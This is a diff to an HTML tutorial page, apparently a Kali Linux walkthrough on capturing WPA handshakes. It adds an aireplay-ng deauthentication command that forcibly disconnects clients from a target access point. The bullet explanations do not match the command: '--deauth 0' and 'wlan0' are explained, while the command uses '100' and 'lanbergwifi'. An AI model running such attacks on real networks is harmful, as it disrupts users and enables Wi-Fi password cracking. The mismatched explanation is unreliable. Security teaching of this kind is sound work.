@@ -263,7 +263,17 @@
 				<li><strong>-w /home/kali/airodump-ng/xx:xx:xx:xx:xx:xx:</strong> Specifies the location where the captured data, including the WPA handshake, will be saved.</li>
 			</ul>
 			
-			<p>After running the command, the output shows details about the network and the captured handshake. Here’s a breakdown of the key elements of the output:</p>
+			<p><strong>Forcing a Handshake:</strong></p>
+			<p>If the handshake is not automatically captured (e.g., no devices are actively reconnecting), you can force a disconnection of clients using the following command:</p>
+			<pre><code>kali@kali ~> sudo aireplay-ng --deauth 100 -a XX:XX:XX:XX:XX:XX lanbergwifi</code></pre>
+			<ul>
+				<li><strong>--deauth 0:</strong> Sends an unlimited number of deauthentication frames to disconnect clients from the target AP.</li>
+				<li><strong>-a XX:XX:XX:XX:XX:XX:</strong> Specifies the BSSID (MAC address) of the target AP.</li>
+				<li><strong>wlan0:</strong> Indicates the wireless interface used for the attack.</li>
+			</ul>
+			<p>This forces connected devices to reconnect, during which the WPA handshake can be captured.</p>
+			
+			<p>After running the command airodump-ng, the output shows details about the network and the captured handshake. Here’s a breakdown of the key elements of the output:</p>
 
 			<pre><code>
 			CH  1 ][ Elapsed: 3 mins ][ 2024-12-31 15:48 ][ WPA handshake: xx:xx:xx:xx:xx:xx 
